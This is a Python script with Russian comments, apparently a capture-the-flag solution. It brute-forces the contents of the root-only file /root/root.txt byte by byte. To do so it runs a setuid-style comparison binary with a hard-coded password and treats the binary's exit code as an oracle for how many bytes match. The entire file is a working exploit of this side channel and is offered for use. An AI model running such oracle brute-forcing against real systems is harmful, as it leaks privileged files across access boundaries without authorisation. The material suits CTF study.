#!/usr/bin/env python3
import subprocess
import os
import sys

BIN = "/usr/bin/ffidYm"
TARGET = "/root/root.txt"
PW = "YaSjelVsyuSm3tanu:("
GUESS = "/tmp/guess.bin"

def run_cmp_get_exitcode(guess_data):
    """Запускает сравнение и возвращает exit code"""
    with open(GUESS, "wb") as f:
        f.write(guess_data)
    
    proc = subprocess.Popen(
        [BIN, TARGET, GUESS],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    proc.communicate(input=(PW + "\n").encode())
    return proc.returncode

def find_length():
    """Определяем длину - зная что начинается с 'CTF{' и всего 36 символов"""
    # Проверяем, что файл действительно начинается с CTF{
    test_data = b"CTF{" + b"\x00" * 31  # 4 + 31 = 35, нужно 36
    
    # Пробуем разные длины от 36
    for length in range(36, 50):
        data = b"CTF{" + b"A" * (length - 5) + b"}"
        data = data[:length]  # обрезаем до нужной длины
        
        exit_code = run_cmp_get_exitcode(data)
        print(f"Testing length {length}: exit_code={exit_code}")
        
        # Если exit_code >= 4 (первые 4 байта 'CTF{' правильные)
        if exit_code >= 4:
            return length
    
    return 36  # по умолчанию, если не нашли

def brute_flag(length=36):
    """Брутфорсим флаг"""
    known = bytearray(b"CTF{")  # начинаем с известного префикса
    
    # Уже знаем первые 4 символа: C, T, F, {
    # Должно быть 36 символов, значит нужно найти 32 символа (36 - 4)
    
    for i in range(4, length):
        print(f"\n[*] Position {i+1}/{length}: ", end="")
        
        found = False
        # Перебираем печатные ASCII символы сначала
        for b in range(32, 127):
            # Строим тестовые данные
            guess = known + bytes([b]) + b"\x00" * (length - i - 1)
            exit_code = run_cmp_get_exitcode(guess)
            
            # Debug: показываем прогресс
            if b % 32 == 0:
                print(".", end="", flush=True)
            
            # Логика проверки
            if exit_code > i:
                known.append(b)
                found = True
                char = chr(b) if 32 <= b < 127 else f"\\x{b:02x}"
                print(f"\n  [+] Found: '{char}' (0x{b:02x}) at pos {i}")
                break
            
            # Проверка для последнего символа
            if i == length - 1 and exit_code == 0:
                known.append(b)
                found = True
                print(f"\n  [+] Last char: '{chr(b)}' (0x{b:02x})")
                break
        
        if not found:
            # Если не нашли среди печатных, пробуем все 256
            print("\n  [!] Trying full range...")
            for b in range(256):
                guess = known + bytes([b]) + b"\x00" * (length - i - 1)
                exit_code = run_cmp_get_exitcode(guess)
                
                if exit_code > i or (i == length - 1 and exit_code == 0):
                    known.append(b)
                    found = True
                    char_repr = chr(b) if 32 <= b < 127 else f"\\x{b:02x}"
                    print(f"  [+] Found: {char_repr} (0x{b:02x})")
                    break
        
        if not found:
            print(f"\n[-] Failed at position {i}")
            # Пробуем использовать -1 как индикатор
            if i == length - 1:
                for b in range(256):
                    guess = known + bytes([b])
                    exit_code = run_cmp_get_exitcode(guess)
                    if exit_code == -1:
                        known.append(b)
                        print(f"  [+] Found via -1: \\x{b:02x}")
                        found = True
                        break
            
            if not found:
                print(f"Current known: {known}")
                return bytes(known)
    
    return bytes(known)

def smart_brute(length=36):
    """Умный брут с использованием известной информации о формате флага"""
    # Флаг обычно содержит: буквы, цифры, подчеркивание
    charset = bytearray()
    
    # Добавляем возможные символы флага
    charset.extend(range(ord('a'), ord('z') + 1))  # a-z
    charset.extend(range(ord('A'), ord('Z') + 1))  # A-Z
    charset.extend(range(ord('0'), ord('9') + 1))  # 0-9
    charset.extend([ord('_'), ord('-'), ord('!'), ord('@'), ord('#'), ord('$'), ord('%'), ord('^'), 
                    ord('&'), ord('*'), ord('('), ord(')'), ord('+'), ord('='), ord('['), ord(']'),
                    ord('{'), ord('}'), ord('|'), ord('\\'), ord(':'), ord(';'), ord('"'), ord('\''),
                    ord('<'), ord('>'), ord('?'), ord(','), ord('.'), ord('/'), ord('`'), ord('~')])
    
    known = bytearray(b"CTF{")
    
    print(f"[*] Using charset: {bytes(charset[:20]).decode()}...")
    
    for i in range(4, length):
        print(f"\n[*] Position {i+1}/{length}:")
        
        found = False
        # Пробуем сначала закрывающую скобку для последней позиции
        if i == length - 1:
            guess = known + b"}" + b"\x00" * (length - i - 1)
            exit_code = run_cmp_get_exitcode(guess)
            if exit_code > i or exit_code == 0:
                known.append(ord('}'))
                print("  [+] Last char is '}'")
                break
        
        for b in charset:
            guess = known + bytes([b]) + b"\x00" * (length - i - 1)
            exit_code = run_cmp_get_exitcode(guess)
            
            # Показываем кандидатов
            if exit_code > i:
                known.append(b)
                found = True
                print(f"  [+] '{chr(b)}' (0x{b:02x})")
                break
        
        if not found:
            print("  [!] Not in charset, trying full range...")
            for b in range(256):
                guess = known + bytes([b]) + b"\x00" * (length - i - 1)
                exit_code = run_cmp_get_exitcode(guess)
                
                if exit_code > i:
                    known.append(b)
                    found = True
                    print(f"  [+] Found: \\x{b:02x}")
                    break
    
    return bytes(known)

def main():
    print("[*] CTF Flag Brute-forcer")
    print("[*] Assuming flag format: CTF{...} (36 chars)")
    
    # Проверяем префикс
    print("\n[*] Verifying prefix 'CTF{'...")
    test_data = b"CTF{" + b"\x00" * 32
    exit_code = run_cmp_get_exitcode(test_data)
    print(f"Exit code with 'CTF{...}': {exit_code}")
    
    if exit_code < 4:
        print("[-] Prefix 'CTF{' doesn't seem correct")
        # Возможно файл не начинается с CTF{
        length = find_length()
        print(f"[+] Detected length: {length}")
        data = brute_flag(length)
    else:
        print("[+] Prefix 'CTF{' confirmed!")
        length = 36
        # data = brute_flag(length)
        data = smart_brute(length)
    
    print("\n" + "="*60)
    print("[+] RECOVERED FLAG:")
    print("="*60)
    
    try:
        flag_str = data.decode('utf-8')
        print(f"String: {flag_str}")
    except:
        flag_str = data.decode('utf-8', errors='replace')
        print(f"String (with replacement): {flag_str}")
    
    print(f"\nHex: {data.hex()}")
    print(f"Length: {len(data)} bytes")
    
    # Проверяем, что заканчивается на }
    if data.endswith(b"}"):
        print("\n[✓] Flag ends with '}' - looks good!")
    
    # Сохраняем
    with open("/tmp/flag.txt", "wb") as f:
        f.write(data)
    print(f"\n[+] Saved to /tmp/flag.txt")

if __name__ == "__main__":
    main()
